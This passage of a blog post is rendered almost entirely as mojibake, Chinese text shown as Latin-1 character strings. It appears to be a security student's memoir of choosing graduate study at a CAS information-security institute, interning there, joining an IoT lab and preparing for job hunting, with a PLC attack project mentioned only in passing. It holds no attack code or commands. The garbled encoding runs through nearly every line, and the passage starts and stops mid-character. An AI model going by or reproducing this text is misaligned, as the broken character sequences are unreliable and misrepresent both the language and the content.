·çš„é€‰æ‹©ã€‚</p><p>æœ¬æ¥åœ¨å¤§ä¸€å¤§äºŒæ—¶çš„è€ƒè™‘æ˜¯ç›´æ¥æœ¬ç§‘æ¯•ä¸šå°±å»å·¥ä½œï¼Œä½†åœ¨å®¶äººä¸€è‡´åŠè¯´çš„æƒ…å†µä¸‹å¼€å§‹è€ƒè™‘è¯»ç ”çš„äº‹æƒ…ã€‚ç”±äºä¸€å¼€å§‹æ²¡æœ‰ä¿ç ”çš„æ‰“ç®—ï¼Œå¯¼è‡´æˆ‘çš„ç»©ç‚¹ä¸é«˜ï¼Œå¯ä»¥ç›´æ¥passä¿ç ”çš„è·¯äº†ã€‚å¦‚æœçœŸè¦å»è¯»ç ”å°±åªèƒ½è€ƒç ”äº†ï¼Œå½“æ—¶æƒè¡¡åˆ©å¼Šå¦‚æœæˆ‘æœ¬ç§‘èƒ½æ‰¾åˆ°å¤§å‚çš„å¥½å²—ä½ï¼Œé‚£å°±ç›´æ¥å»å·¥ä½œï¼›å¦‚æœä¸èƒ½æ‰¾åˆ°å¥½å²—ä½ï¼Œé‚£ä¹ˆæœ¬ç§‘çš„åŠ£åŠ¿å°±ä¼šå¾ˆå¤§ã€‚ç»¼åˆè€ƒè™‘ä¹‹åè§‰å¾—æˆ‘è‡ªèº«ç°æœ‰æŠ€èƒ½æ°´å¹³æ— æ³•æ‰¾åˆ°ä¸€ä¸ªå¾ˆå¥½çš„å·¥ä½œï¼Œäºæ˜¯å¼€å§‹å‡†å¤‡è€ƒç ”çš„äº‹æƒ…ã€‚ä½†æ˜¯å…‰å†³å®šè€ƒç ”ï¼Œè¿˜éœ€è¦ç¡®å®šè¦è€ƒå“ªé‡Œï¼Ÿè€ƒç ”å’Œé«˜è€ƒä¸ä¸€æ ·ï¼Œåªèƒ½é€‰æ‹©ä¸€æ‰€å­¦æ ¡æŠ¥åï¼Œè€Œä¸æ˜¯åƒé«˜è€ƒä¸€æ ·çš„å…ˆè€ƒè¯•ï¼Œå‡ºåˆ†åæ ¹æ®åˆ†æ•°é€‰æ‹©ã€‚å¤šæ–¹å’¨è¯¢ä¹‹åå¾—çŸ¥äº†ä¿¡å·¥æ‰€ï¼Œæˆ‘çš„ä¸¤ä¸ªå­¦é•¿éƒ½å»äº†é‚£é‡Œï¼Œå†åŠ ä¸Šæ˜¯ä¸“é—¨åšå®‰å…¨çš„ç ”ç©¶æ‰€ï¼Œå¤–åŠ ä¸­ç§‘é™¢çš„å…‰ç¯ï¼Œé€¼æ ¼æ‹‰æ»¡äº†ï¼Œæ¯”æ³¥ç”µçš„å®‰å…¨ä¸çŸ¥é“å¥½å¤šå°‘ï¼ˆæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆæ³¥ç”µçš„ä¿¡æ¯å®‰å…¨ä¸ºå•¥æ€»èƒ½æ’åœ¨å…¨å›½å‰åˆ—ï¼Œå¾ˆæ˜¯è¿·æƒ‘ï¼‰ã€‚åœ¨åŠ ä¸Šç‹é“è®ºå›ä¸Šçš„ä¿¡å·¥æ‰€å„ç ”ç©¶å®¤ä»‹ç»éå¸¸è¯¦ç»†ï¼Œç½‘ä¸Šä¿¡æ¯+ç†Ÿäººä¿¡æ¯å¯¹æˆ‘éå¸¸æœ‰åˆ©ï¼Œäºæ˜¯ä¹ï¼Œä¿¡å·¥æ‰€æˆä¸ºäº†æˆ‘è€ƒç ”çš„ç›®æ ‡ã€‚</p><p>åœ¨å†³å®šè¦å»ä¿¡å·¥æ‰€è¯»ç ”ä¹‹åï¼Œå¼€å§‹å¸ƒå±€æ•´ä¸ªè€ƒç ”çš„è§„åˆ’ã€‚ä»å¤§ä¸‰ä¸‹å¼€å§‹ï¼Œæˆ‘ä»¬å°†æœ‰ä¸€æ®µå®ä¹ ï¼Œè¿™æ®µå®ä¹ æˆ‘å‡†å¤‡å»ä¿¡å·¥æ‰€ï¼Œè¿™æ ·ä¹Ÿæ˜¯ä¸ºäº†ä¹‹åè€ƒç ”å¤è¯•åšå‡†å¤‡ï¼Œæå‰ç†Ÿæ‚‰ç ”ç©¶æ‰€çš„ç¯å¢ƒï¼Œäº†è§£å†…éƒ¨çš„å…·ä½“æƒ…å†µï¼Œæ–¹ä¾¿ä¹‹åè¯»ç ”çš„å¯¼å¸ˆé€‰æ‹©ã€‚åœ¨å®ä¹ é˜¶æ®µï¼Œå¼€å§‹å‡†å¤‡è€ƒç ”çš„å†…å®¹ï¼ˆè™½ç„¶æœ€åä¹Ÿæ²¡å‡†å¤‡å¤ªå¤šä¸œè¥¿ï¼‰ï¼Œåˆ°äº†å¤§å››ä¸Šå­¦æœŸé›†ä¸­å­¦ä¹ è€ƒç ”å†…å®¹ï¼Œå†²åˆºåˆ°12æœˆåº•ã€‚äºæ˜¯ï¼Œæˆ‘åœ¨å¤§ä¸‰ä¸Šå­¦æœŸçš„æœ«å°¾æ­£å¼å¼€å¯äº†6ä¸ªæœˆçš„ä¿¡å·¥æ‰€å®ä¹ ä¹‹è·¯ï¼Œåœ¨2018å¹´1æœˆæ¥åˆ°äº†åŒ—äº¬ï¼Œä½åœ¨â€œæˆ‘çš„å®¿èˆâ€ä¸­ã€‚</p><p>å¤§ä¸‰ä¸‹å­¦æœŸåœ¨ä¿¡å·¥æ‰€å…­å®¤å®ä¹ çš„è¿‡ç¨‹ä¸­ï¼Œé‡è§äº†å¾ˆå¤šå¤§ä½¬ï¼Œåœ¨æ­¤ä¹‹å‰æˆ‘ä¸€ç›´ä»¥ä¸ºè‡ªå·±è¿˜ç®—æ˜¯æ¯”è¾ƒåŠªåŠ›çš„äººï¼Œä½†åœ¨çœ‹åˆ°å¤§ä½¬ä»¬çš„ä½œæ¯ä¹‹åæ‰æ„è¯†åˆ°ï¼Œä¼˜ç§€çš„äººéƒ½æ˜¯è¿™ä¹ˆä¸“æ³¨ï¼ŒåºŸå¯å¿˜é£Ÿèˆ¬çš„å­¦ä¹ ï¼Œæˆ‘ä¹‹å‰çš„åŠªåŠ›çœ‹èµ·æ¥å°±åƒæ˜¯å°æ‰“å°é—¹ã€‚æœ‰ä¸€å¥æµä¼ ç”šè¿œçš„è¯ï¼šâ€œæ¯”ä½ æœ‰å¤©èµ‹çš„äººï¼Œè¿˜æ¯”ä½ æ›´åŠ åŠªåŠ›â€ï¼Œè¿™å°±æ˜¯æˆ‘æœ€ç›´è§‚çš„æ„Ÿå—ã€‚åœ¨è¿™ä¹‹åï¼Œæˆ‘å¼€å§‹ç«¯æ­£è‡ªå·±çš„å­¦ä¹ æ€åº¦ï¼Œåœ¨æ²¡åŠªåŠ›åˆ°æ‹¼å¤©èµ‹çš„æƒ…å†µä¸‹ç»§ç»­åŠ æ²¹ã€‚</p><h2 id="å¤§å››"><a href="#å¤§å››" class="headerlink" title="å¤§å››"></a>å¤§å››</h2><p>é£äº‘å˜å¹»çš„å¤§å››ï¼Œæ¯ä¸ªäººéƒ½æœ‰äº†è‡ªå·±çš„å½’å®¿ã€‚</p><p>å¤§å››ä¸Šå­¦æœŸå‡ ä¹æ²¡æœ‰è¯¾ç¨‹ï¼Œæˆ‘å¼€å§‹äº†æœ€å4ä¸ªæœˆçš„è€ƒç ”å†²åˆºï¼Œå½“æ—¶çš„ç­–ç•¥æ˜¯è‹±è¯­å’Œæ”¿æ²»è¿‡åŠæ ¼çº¿ï¼Œæ•°å­¦å’Œä¸“ä¸šäº‰å–æ‹¿æ›´é«˜åˆ†ã€‚å› æ­¤ï¼Œæˆ‘çš„è‹±è¯­å…¨é ä¸€ä¸ªè¡¥ä¹ ç­æ’‘ä½ï¼Œè¿é¢˜éƒ½æ²¡åˆ·ï¼ŒåªèƒŒäº†ä¸€ä¸ªè‹±è¯­ä½œæ–‡æ¨¡æ¿ï¼Œæ²¡æƒ³åˆ°æœ€åå·®ç‚¹æ²¡è¿‡ï¼ˆè€ƒè¯•42åˆ†ï¼ŒåŠæ ¼çº¿39åˆ†ï¼‰ï¼›æ”¿æ²»æŠ¥äº†ä¸€ä¸ªå­¦æ ¡å†…çš„å¤§ç­ï¼Œå†åŠ ä¸Šè‡ªå·±åœ¨Bç«™å­¦ä¹ å¾æ¶›çš„ç½‘è¯¾ï¼Œæœ€åå†²åˆºè‚–å››è‚–å…«ç½‘ä¸Šæ€»ç»“æ¨¡æ¿ã€‚å°±è¿™æ ·çš„æƒ…å†µä¸‹ï¼ŒæŒ¤å‡ºäº†ä¸€ä¸ªå¤šæœˆå­¦ä¹ æ•°å­¦å’Œä¸€ä¸ªæœˆçš„æ—¶é—´å­¦ä¸“ä¸šè¯¾ï¼Œæ•´ä¸ªè¿‡ç¨‹æ¢¦å›é«˜ä¸‰ï¼Œé™¤äº†å­¦ä¹ å°±æ˜¯ç¡è§‰ï¼Œè€Œæˆ‘å­¦ä¹ çš„åœ°ç‚¹æ­£å¥½åœ¨ç½‘ç®¡ä¼šåŠå…¬å®¤ï¼Œè¿™ä¸ªå¾—å¤©ç‹¬åšçš„å®åœ°ï¼Œå‡ ä¹æ²¡äººå åº§ï¼Œå£°éŸ³ä¹Ÿä¸å¤§ï¼Œéå¸¸é€‚åˆè€ƒç ”ã€‚</p><p>åœ¨åº¦è¿‡äº†æ¼«é•¿çš„åˆè¯•ï¼Œæ—¶é—´æ¥åˆ°äº†ç¬¬äºŒå¹´å¤§å››ä¸‹å­¦æœŸï¼Œæˆ‘ç»§ç»­å»äº†ä¿¡å·¥æ‰€å¼€å§‹ä¸ºæœ€åçš„å¤è¯•åšå‡†å¤‡ï¼Œç„¶è€Œåœ¨å®ä¹ çš„è¿‡ç¨‹ä¸­æ…¢æ…¢å‘ç°æƒ…å†µæœ‰ç‚¹ä¸å¤ªå¯¹åŠ²ï¼Œæœ¬æ¥å‡†å¤‡å»å…­å®¤G2ï¼Œç»“æœç«äº‰è€…è¿‡å¤šååˆ†æƒ¨çƒˆï¼Œå½“æ—¶å®ä¹ çš„äººå°±æœ‰å¥½å‡ ä¸ªï¼Œä½†çŒœæµ‹åé¢åªæœ‰å‡ ä¸ªï¼Œååˆ†ç´§å¼ ã€‚åˆè¯•æˆç»©å‡ºæ¥ä¹‹åï¼Œæˆ‘å‰é¢çš„ä¸€ä¸ªå“¥ä»¬ï¼Œæ€»åˆ†æ²¡è¿‡çº¿ã€‚ã€‚æˆ‘çœ‹ç€è‡ªå·±çš„è‹±è¯­ä½åˆ†é£˜è¿‡ï¼ŒçœŸçš„æ˜¯æƒŠé™©ã€‚æ€€ç€å¿å¿‘çš„å¿ƒæƒ…ç»§ç»­åˆ°äº†ä¸‹ä¸€é˜¶æ®µï¼Œç­‰ç€æˆ‘çš„å´æ˜¯æ•´ä¸ªå…­å®¤åªæœ‰ä¸€åé¢çš„æ‚²æƒ¨äº‹å®ã€‚æˆ‘çš„è„‘è¢‹å…ˆæ˜¯ä¸€æ‡µï¼Œéšåå¼€å§‹äº†é«˜é€Ÿè¿è½¬ï¼Œé”å®šæ¥ä¸‹æ¥çš„ç›®æ ‡ï¼Œå› ä¸ºæˆ‘ä¸ªäººèƒ½åŠ›æ›´åå‘å®‰å…¨æµ‹è¯•ï¼Œæ‰€ä»¥é¦–å…ˆæ’é™¤äº†å›½é‡ï¼ˆåç†è®ºï¼Œä¸”ckç»„å¾ˆéš¾è¿›ï¼‰ï¼ŒäºŒå®¤ï¼ˆåå·¥ç¨‹ï¼‰ï¼Œä¸‰å®¤ï¼ˆæœºå™¨å­¦ä¹ ï¼‰ï¼Œæœ€ç»ˆåœ¨å››å®¤å’Œäº”å®¤ä¸­é€‰æ‹©ã€‚</p><p>å½“æ—¶æˆ‘è™½ç„¶å­¦çš„æ˜¯webå®‰å…¨ï¼Œä½†æœ‰ä¸€ç§æƒ³è¦è½¬å‹çš„æƒ³æ³•ï¼Œæ¯•ç«Ÿå­¦webå®‰å…¨çš„äººå¤ªå¤šäº†ï¼Œæˆ‘å­¦çš„ä¹Ÿä¸æ˜¯ç‰¹åˆ«ç²¾è¿›ï¼Œæ²¡æœ‰åŠæ³•ä½“ç°è‡ªèº«çš„ä¼˜åŠ¿ï¼Œè¦ä»webè½¬äºŒè¿›åˆ¶ï¼Œæ¯”è¾ƒå®¹æ˜“çš„é“è·¯å°±æ˜¯IoTå®‰å…¨æ–¹å‘ï¼Œå…¶ä¸­å¤¹æ‚ç€webå’ŒäºŒè¿›åˆ¶çš„å†…å®¹ï¼Œè¿™æ ·æˆ‘åŸæ¥å­¦ä¹ çš„å†…å®¹ä¹Ÿèƒ½ç”¨ä¸Šï¼ŒåŸºäºè¿™æ ·çš„æƒ³æ³•æœ€ç»ˆé€‰æ‹©äº†å››å®¤çš„ç‰©è”ç½‘å®éªŒå®¤ã€‚éšåçš„å°±æ˜¯é‚®ä»¶è”ç³»ï¼Œæ²¡æƒ³åˆ°çš„æ˜¯æˆ‘å±…ç„¶è¢«ä¸‰å·¨å¤´æå‰é¢è¯•ï¼Œç„¶åè¢«å­™è€æ¿æˆåŠŸæ”¶ç•™ã€‚ï¼ˆæ¯•ä¸šç”Ÿå®¢è§‚çš„æ¥çœ‹ï¼Œè¿™ä¸ªé€‰æ‹©è¿˜ç®—å°†å°±ï¼Œä»ä¸­å­¦ä¹ åˆ°äº†çŸ¥è¯†ï¼Œä¹Ÿè·å¾—äº†æˆ‘æƒ³è¦çš„èƒ½åŠ›ï¼Œè™½ç„¶è¿‡ç¨‹å¾ˆè‰°è¾›å°±æ˜¯äº†ï¼‰</p><p>åˆ°äº†å¤§å››çš„æ”¶å°¾çš„é˜¶æ®µï¼Œæˆ‘æˆåŠŸçš„è€ƒç ”ä¸Šå²¸è·å¾—äº†å½•å–é€šçŸ¥ä¹¦ï¼Œèº«è¾¹çš„æœ‹å‹åŒå­¦ä¹Ÿé™†é™†ç»­ç»­çš„å†³å®šäº†ä¿ç ”ã€å‡ºå›½ã€å·¥ä½œï¼Œä¹…è¿çš„è½»æ¾æ„Ÿè¦ç»•åœ¨æˆ‘çš„èº«å¿ƒï¼Œæ„Ÿè§‰åˆå›åˆ°äº†å¤§ä¸€ã€‚æœ€åçš„æ¯•è®¾å› ä¸ºç§ç§åŸå› ï¼Œå†™äº†ä¸€ä¸ªåƒåœ¾çš„webç³»ç»Ÿå°±æ··è¿‡å»äº†ï¼Œåˆ˜æ¡¥è€å¸ˆä¹Ÿæ²¡å–·æˆ‘ï¼Œè¿˜å¥½æ²¡é‡ä¸Šç¿”å“¥ï¼Œä¸ç„¶æˆ‘è§‰å¾—ä¼šè¢«å¾€æ­»é‡Œå–·ã€‚æ¯•ä¸šç­”è¾©ä¹‹åçš„æ—¥å­é‡Œï¼Œå¤§å®¶ä¸€èµ·å¤©å¤©åƒåƒå–å–ï¼Œå°±è¿™æ ·æ½‡æ´’äº†å¤§åŠä¸ªæœˆï¼Œåˆ°äº†åˆ†åˆ«çš„æ—¶å€™ä¹Ÿæ²¡æœ‰æƒ³è±¡ä¸­çš„æ‚²ä¼¤ï¼Œæ”¶æ‹¾å¥½è‡ªå·±çš„è¡Œæï¼Œå°†å‰©ä¸‹çš„ä¹¦æœ¬ç•™ç»™å­¦å¼Ÿå­¦å¦¹ï¼Œæˆ‘å°±è¿™æ ·ç¦»å¼€äº†æˆç”µã€‚</p><p>æœ€ååˆ†äº«ä¸€ç¯‡å½“æ—¶çœ‹åˆ°çš„éœ‡æ’¼å¿ƒçµçš„æ–‡ç« ï¼Œæ¥è‡ª2014çº§çš„ä¸€ä½å­¦é•¿ã€‚<a href="https://mp.weixin.qq.com/s/oLYrnTWSy0ojM8TMg46PzQ" target="_blank" rel="noopener">ã€Šæä»¤æˆï¼šè‡´å­¦å¼Ÿå­¦å¦¹ | è¾¾äººShowã€‹</a></p><h2 id="ç ”ä¸€"><a href="#ç ”ä¸€" class="headerlink" title="ç ”ä¸€"></a>ç ”ä¸€</h2><p>æ¨¡æ‹Ÿorâ€œæ°´â€é¾™å¤´ï¼ŸIIEå…¨éƒ½è¦ï¼ï¼ï¼</p><p>è¿˜æ²¡å…¥å­¦æˆ‘ä»¬å°±è¢«IIEä¸Šäº†ä¸€è¯¾ï¼Œç³»ç»Ÿä¸­çš„å•äººé—´ï¼Œè¿‡äº†æ®µæ—¶é—´ç›´æ¥è’¸å‘ï¼ŒIIEå–œè·æ¨¡æ‹Ÿæ‰€ç§°å·ï¼Œå­¦ç”Ÿçš„åæŠ—å¾®ä¸è¶³é“ï¼Œä½†ä¹Ÿå› æ­¤ç•™ä¸‹äº†å¹´çº§ç¾¤ï¼Œä¸ºåç»­æ•´ä¸ªå¹´çº§çš„ä¿¡æ¯äº¤æµæä¾›äº†ç¯å¢ƒï¼Œä»»ä½•æ—¶å€™æœ‰ä¸€ä¸ªæ‰“é€šæ‰€æœ‰äººçš„æ²Ÿé€šæ¸ é“æ˜¯ååˆ†é‡è¦çš„äº‹æƒ…ã€‚å…¥å­¦ç¬¬ä¸€å¤©ï¼Œæ‰€é•¿å’Œå‰¯æ‰€é•¿è®²è¯æåˆ°ï¼Œæˆ‘ä»¬æ‰€æ˜¯é¾™å¤´æ‰€ï¼Œè¾“å‡ºä»·å€¼å‡ ä¸ªäº¿çš„å·¥ç¨‹é¡¹ç›®ï¼Œæˆ‘å†…å¿ƒOSï¼šé¾™å¤´æ‰€ï¼Ÿæ°´é¾™å¤´ï¼ğŸš°ã€‚IIEä¸­çš„å»‰ä»·å·¥åŠï¼Œåªæœ‰å—è‹¦çš„å­¦ç”Ÿï¼Œç°åœ¨æƒ³æƒ³çœŸæ˜¯è‹¦é€¼ï¼Œä¸ºäº†é‚£å‡ ä¸ªå°é’±1kã€2kï¼Œè¦åšè¿™ä¹ˆå¤šåƒåœ¾å·¥ç¨‹é¡¹ç›®ï¼Œè¿˜ä¸å‡†å®ä¹ ï¼Œå®åœ¨æ˜¯ä¸çˆ½å‘€ã€‚</p><p>é›æ –æ¹–çš„ç”Ÿæ´»ååˆ†çš„ä¸åŒï¼Œå‘¨å›´æ²¡æœ‰å•†ä¸šè¡—ï¼Œå»æœ€è¿‘çš„ä¸‡è¾¾å¹¿åœºè¦10å…¬é‡Œï¼Œäº¤é€šåªæœ‰å°é»‘è½¦å’Œé•¿é€”å…¬äº¤ã€‚ä¸ºäº†çæƒœç©è€æ—¶é—´ï¼Œæˆ‘å’Œå®¤å‹æœ‰ä¸€æ¬¡å»è¿çœ‹ä¸¤åœºç”µå½±ï¼Œå¤–åŠ åƒäº†ä¸€é¡¿è±ªååˆ·è‚‰ç«é”…ï¼Œåƒå¥½ç©å¥½æ‰æ…¢æ‚ æ‚ çš„å›åˆ°å­¦æ ¡ã€‚åœ¨è¿™äº›å¿«ä¹çš„æ—¶å…‰ä¹‹å¤–ï¼Œæ˜¯è¢«å¤§ä½œä¸šæ”¯é…çš„ææƒ§ï¼Œåœ¨å¤§ä½œä¸šé›†ä¸­çš„æ—¶é—´æ®µå‡ ä¹æ²¡æœ‰ä¼‘æ¯çš„æ—¶é—´ï¼Œå‘¨ä¸€åˆ°å‘¨æ—¥éƒ½åœ¨æ— ä¼‘æ­¢çš„æŸ¥èµ„æ–™å’Œå†™ä½œä¸šï¼Œæœ‰äº›è¯¾ç¨‹è¿˜æ˜¯ä¸Šè¯¾æ‹§èºä¸ï¼Œä¸‹è¯¾é€ ç«ç®­ï¼Œè¦åšä¸ªä½œä¸šæŸ¥ä¸€é¡¿èµ„æ–™ã€‚ã€‚ã€‚è™½ç„¶è¿™æ ·é”»ç‚¼äº†ä¿¡æ¯æ”¶é›†å’Œå¿«é€Ÿå­¦ä¹ èƒ½åŠ›ï¼Œä½†è¿˜æ˜¯è¦åæ§½ã€‚</p><p>ä¸ŠåŠå¹´ç»“æŸä¹‹åï¼Œæ¥åˆ°2020å¹´ï¼Œè¿™ä¸ªä¸–ç•Œè½¬æŠ˜ä¹‹å¹´ã€‚ä»è¿™ä¸€å¹´å¼€å§‹ï¼Œä¸€åˆ‡éƒ½å˜äº†ï¼Œç–«æƒ…æˆä¸ºäº†ä¸€åº§è·¨ä¸è¿‡çš„å¤§å±±ï¼Œæ—…æ¸¸ä¸šã€ç”µå½±ã€èˆªç©ºç­‰è¡Œä¸šè¿æ¥äº†ç­é¡¶ä¹‹ç¾ï¼Œçº¿ä¸‹å®ä½“è¡Œä¸šä¹Ÿå—åˆ°ä¸åŒç¨‹åº¦çš„é‡åˆ›ï¼ŒçœŸæ˜¯æ€€å¿µè¿‡å»é‚£æ ·è‡ªç”±è‡ªåœ¨çš„ç”Ÿæ´»ã€‚ç–«æƒ…çš„å‘ç”Ÿï¼Œè®©æˆ‘ä»¬æ•´ä¸ªå­¦æœŸéƒ½æ²¡åŠæ³•å»å­¦æ ¡ï¼Œçº¿ä¸Šè¯¾ç¨‹å¼€å§‹æˆä¸ºæ—¥å¸¸ã€‚é‚£æ®µæ—¶é—´ç”±äºåœ¨å®¶é‡Œå­¦ä¹ ï¼Œæˆ‘çš„æ•´ä¸ªæ•ˆç‡å˜å¾—éå¸¸ä½ä¸‹ï¼Œè™½ç„¶æ²¡é€‰å¾ˆå¤šè¯¾ç¨‹ï¼Œä½†æœ€åç•™ç»™è‡ªå·±çš„å­¦ä¹ æ—¶é—´å´æ²¡æœ‰å¾ˆå¤šã€‚åŒæ—¶æˆ‘æœ‰ä¸€ä¸ªé—æ†¾ï¼Œé‚£å°±æ˜¯æ²¡æœ‰è¶ç€ç–«æƒ…çš„æ—¶é—´å»æ‰¾å®ä¹ ï¼Œé‚£æ®µæ—¶é—´ç®€ç›´æ˜¯é»„é‡‘å®ä¹ ç‚¹ï¼Œæˆ‘åº”è¯¥éšä¾¿æ‰¾ä¸ªæˆéƒ½æœ¬åœ°çš„å®‰å…¨ä¼ä¸šï¼Œè¾¹æ‰“å·¥è¾¹ä¸Šè¯¾ï¼Œåˆèƒ½å­¦ä¹ çŸ¥è¯†ï¼Œåˆèƒ½èµšé’±è¿˜ä¸è€½è¯¯ä¸Šè¯¾ã€‚é”™è¿‡äº†è¿™ä¸ªå®ä¹ æœºä¼šç‚¹ä¹‹åï¼Œæˆ‘å†ä¹Ÿæ²¡åŠæ³•æ‰¾æœºä¼šå»å®ä¹ äº†ï¼ˆé™¤äº†çº¿ä¸Šï¼‰ã€‚å‘œå‘œå‘œ~</p><h2 id="ç ”äºŒ"><a href="#ç ”äºŒ" class="headerlink" title="ç ”äºŒ"></a>ç ”äºŒ</h2><p>ç ”ç©¶ç”Ÿ != é«˜çº§æœ¬ç§‘ç”Ÿï¼Œç ”ç©¶ç”Ÿ â‰ˆ ç¤¾ç•œã€‚</p><p>ç ”äºŒçš„å¼€å§‹ï¼Œæˆ‘ä»¬æ­£å¼å›åˆ°ç ”ç©¶æ‰€ï¼Œå¼€å¯äº†ä¸ºæ‰€æ‰“å·¥çš„åºå¹•ã€‚æˆ‘å¼€å§‹æ¥æ‰‹ä¸€äº›è¾£é¸¡é¡¹ç›®ï¼Œæ¯”å¦‚æŸPLCæ”»å‡»çš„é¡¹ç›®ï¼Œå¬èµ·æ¥ä¼¼ä¹å¾ˆé«˜ç«¯ï¼Œç„¶è€Œç»“æœå´æ˜¯æ¨¡æ‹Ÿå‘åŒ…ï¼Œæ²¡æœ‰æŠ€æœ¯å«é‡ï¼Œå°±è¿™ä¸ªç ´é¡¹ç›®ä¸€ç›´æ‹–æ‹–æ‹‰æ‹‰åšäº†å¿«åŠå¹´ã€‚æˆ‘å¼€å§‹ä¸ºä¹‹åçš„æœªæ¥ç„¦è™‘ï¼Œæˆ‘ç°åœ¨åšè¿™äº›ä¸œè¥¿å¹¶ä¸èƒ½ä¸ºä¹‹åçš„æ‰¾å·¥ä½œæä¾›å¸®åŠ©ï¼Œéœ€è¦ä¸€äº›é‡é‡çº§å†…å®¹æ¥æ”¯æ’‘æˆ‘çš„ç®€å†ã€‚å°±åœ¨è¿™æ—¶ckå¸ˆå…„å‡ºç°äº†ï¼Œè·Ÿç€ä»–ä¸€èµ·å­¦ä¹ äº†å¾ˆå¤šä¸œè¥¿ï¼Œä¸ºäº†æ¶ˆåŒ–ä»–çš„ä»£ç æˆ‘èŠ±äº†å¿«3ä¸ªæœˆçš„æ—¶é—´ï¼Œæœ€åå’Œå·çˆ·ä¸€èµ·ä¹Ÿåªç†è§£äº†å¤§éƒ¨åˆ†å†…å®¹ã€‚ååˆ†åº†å¹¸ï¼Œè¿™ä¸ªé¡¹ç›®å‡ ä¹æˆä¸ºä¹‹åç§‹æ‹›çš„åŸºç¡€ï¼Œæˆ‘å½“æ—¶çš„å†³ç­–ååˆ†æœæ–­æ­£ç¡®ï¼Œå°è¯•å¤æ‚å›°éš¾æœ‰æŒ‘æˆ˜çš„äº‹æƒ…ï¼Œèƒ½è®©äººè·å¾—å¿«é€Ÿçš„æˆé•¿ã€‚</p><p>åœ¨ç ”äºŒä¸‹å­¦æœŸè§è¯äº†å¸ˆå…„ä»¬ä¸ºäº†æ¯•ä¸šåšå‡ºçš„åŠªåŠ›ï¼Œæœ‰å¥½å‡ ä¸ªå¸ˆå…„éƒ½æ˜¯ç¡åœ¨å®éªŒå®¤ä¸€ç›´èµ¶å·¥ï¼Œçœ‹åˆ°äº†å¤§å®¶ä¸ºäº†èµ¶æœ€åçš„ddlå‡ ä¹éƒ½æ˜¯ç†¬å¤œçˆ†è‚ï¼Œè¿™å°±æ˜¯å­¦æœ¯åœˆçš„æ—¥å¸¸å§ã€‚æŸå¸ˆå…„ä¸€å¼€å§‹å¯¼å¸ˆä¸è®©æ¯•ä¸šï¼Œäº¤æ¶‰å¤šæ¬¡æ‹¿å‡ºå°å­©å’Œå®¶åº­æ‰è®©å¯¼å¸ˆè®©æ­¥ï¼›æŸå¸ˆå…„çš„è®ºæ–‡å‡ ä¹åˆ°äº†å¿«è¦å»¶æ¯•çš„è¾¹ç¼˜æ‰ä¸­ï¼Œæœ€åå…äºå»¶æ¯•ï¼›æŸå¸ˆå…„çœ¼çœ‹ç€è¦æ¯•ä¸šäº†ï¼Œè¢«æŸsbè€å¸ˆæ‰“äº†ä¸­ï¼Œç»“æœå»¶æ¯•ã€‚äººç”Ÿèµ·èµ·ä¼ä¼ï¼Œåœ¨æ—©æœŸé‡åˆ°å›°éš¾è¦å‹‡æ•¢é¢å¯¹ï¼Œæˆ–è®¸ä¹Ÿæ˜¯äººç”Ÿçš„ç¦æ°”ï¼Œæ‰“ä¸å€’ä½ çš„ä¼šè®©ä½ å˜å¾—æ›´å¼ºï¼Œé‚£ä½å»¶æ¯•çš„å¸ˆå…„ä¹Ÿå› æ­¤å…å—äº’è”ç½‘è£å‘˜é£æ³¢ã€‚å…¶ä¸­çš„ä¸€ä½åŒç»„å¸ˆå…„æ¯•ä¸šæ—¶é€äº†æˆ‘ä¸€å¥è¯ï¼šä¸€å®šè¦å¥½å¥½å­¦ä¹ ï¼ŒæŠ“ç´§æ—¶é—´å­¦ä¹ ï¼Œä»¥åå­¦ä¹ çš„æ—¶é—´å°†ä¼šè¶Šæ¥è¶Šå°‘ï¼Œä½ çš„ç”Ÿæ´»å°†è¢«çç¢å æ®å¤§åŠã€‚</p><p>ç ”äºŒæœ€åçš„æ—¶é—´ä¹Ÿå°±æ˜¯ä¸ºç§‹æ‹›åšæœ€åçš„å‡†å¤‡ï¼Œä¸ºäº†æ‰¾åˆ°å·¥ä½œä¹‹å‰å°±ä¸€ç›´åœ¨æ”¶é›†å®‰å…¨å²—ä½çš„ä¿¡æ¯ï¼ŒIoTå®‰å…¨ç›¸å…³å²—ä½å±å®å¤ªå°‘äº†ï¼Œæœ€åä¹Ÿåªæœ‰10å®¶å·¦å³çš„ä¼ä¸šå¯ä»¥æŠ•ã€‚æ˜ç¡®ç›®æ ‡ä¹‹åï¼Œå¼€å§‹åˆ¶å®šäº†æ•´ä½“å¤ä¹ æ€è·¯ï¼Œé¦–å…ˆæ˜¯å®‰å…¨ç›¸å…³çš„åŸºç¡€çŸ¥è¯†ï¼Œéšåæ˜¯å®‰å…¨ç›¸å…³æ¼æ´çš„åˆ©ç”¨ï¼Œé˜²å¾¡ä»¥åŠç»•è¿‡ï¼Œæœ€åæ˜¯è‡ªå·±çš„é¡¹ç›®å’Œæ¼æ´å®æˆ˜ç»å†ï¼Œè¯¦ç»†å¯ä»¥å‚è€ƒ<a href="https://hurricane618.me/2021/12/08/2021-autunm-recruitment-summary/">æˆ‘è¿‡å»çš„åšå®¢</a>ã€‚ç”±äºç ”ç©¶æ‰€å‹æ¦¨çš„å¤ªç‹ ï¼Œå†åŠ ä¸Šå¼€é¢˜æ—¶é—´æ™šï¼Œæœ€åå‡†å¤‡çš„æ—¶é—´ä¸è¶³ä¸¤ä¸ªæœˆï¼Œè¿™ä¸ªæ—¶å€™å°±ä½“ç°å‡ºè¿‡å»çš„æŠ€æœ¯ç§¯ç´¯çš„é‡è¦æ€§ï¼Œæˆ‘å¾ˆåº†å¹¸ä¹‹å‰ä¸€ç›´ä¿æŒç€å­¦ä¹ çš„çŠ¶æ€ã€‚</p><h2 id="ç ”ä¸‰"><a href="#ç ”ä¸‰" class="headerlink" title="ç ”ä¸‰"></a>ç ”ä¸‰</h2><p>ä¸€æ³¢ä¸‰æŠ˜åé‡è§å½©è™¹ğŸŒˆï¼Œå†è§äº†æˆ‘çš„å­¦ç”Ÿæ—¶ä»£ã€‚</p><p>ç 